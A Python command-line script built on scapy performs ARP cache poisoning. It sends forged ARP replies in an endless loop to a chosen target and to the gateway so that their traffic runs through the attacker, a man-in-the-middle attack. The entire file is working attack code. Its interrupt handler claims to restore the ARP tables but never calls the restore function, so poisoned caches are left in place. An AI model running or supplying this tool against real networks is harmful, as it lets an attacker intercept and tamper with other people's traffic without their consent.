from scapy.all import ARP, Ether, srp, send
from argparse import ArgumentParser, ArgumentError
from typing import NamedTuple
from time import sleep

class Options(NamedTuple):
    '''
    Tuple for storing configuration constants
    '''
    target: str
    gateway: str
    verbose: bool

def get_args() -> 'Options':
    '''
    Parses command arguments for initialization of config options
    '''
    parser = ArgumentParser()
    try:
        parser.add_argument('-t', '--target', dest='target', help='The IP address of the target devices')
        parser.add_argument('-g', '--gateway', dest='gateway', help='The IP address of the network gateway')
        parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose logging for debugging purposes.')
        options = parser.parse_args()
        if not options.target or not options.gateway: 
            error('Invalid arguments. You must specify valid IP addresses for both the target device and network gateway. See help for more info.')
        if not options.verbose:
            options.verbose = False
        return Options(options.target, options.gateway, options.verbose)
    except ArgumentError as e:
        error('An error occurred while parsing input arguments.')
    return Options('','',False)

def get_mac(ip: str) -> str:
    '''
    Determines the corresponding MAC address for a given IP address
    '''
    assert isinstance(ip, str)
    arp_req = ARP(pdst=ip)
    broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_req_broadcast = broadcast / arp_req
    resp_list = srp(arp_req_broadcast, timeout=1, verbose=False)[0]
    print(type(resp_list[0][1].hwsrc))
    return resp_list[0][1].hwsrc

def spoof(target_ip: str, source_ip: str) -> None:
    '''
    Spoofs the IP address of a target_ip with the desired source_ip through ARP requests.
    '''
    assert isinstance(target_ip, str) and isinstance(source_ip, str)
    target_mac = get_mac(target_ip)
    arp_resp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip)
    send(arp_resp, verbose=False)

def restore(dest_ip: str, orig_ip: str) -> None:
    '''
    Restores a previously spoofed IP address of dest_ip with its orig_ip through ARP requests
    '''
    dest_mac = get_mac(dest_ip)
    orig_mac = get_mac(orig_ip)
    arp_resp = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=orig_ip, hwsrc=orig_mac)
    send(arp_resp, count=4, verbose=False)

def error(msg: str) -> None:
    '''
    Prints an error message to standard output before exiting
    '''
    print(f'[-] {msg} Exiting...')
    exit()

def main(*args, **kwargs) -> None:
    config = get_args()
    packet_count = 0
    try:
        while True:
            spoof(config.target, config.gateway)
            spoof(config.gateway, config.target)
            packet_count += 2
            print(f'\r[+] Packets sent: {packet_count}', end='')
            sleep(4)
    except (KeyboardInterrupt, InterruptedError):
        print('\n[+] Detected interrupt. Restoring ARP tables.')

if __name__ == "__main__":
    main()
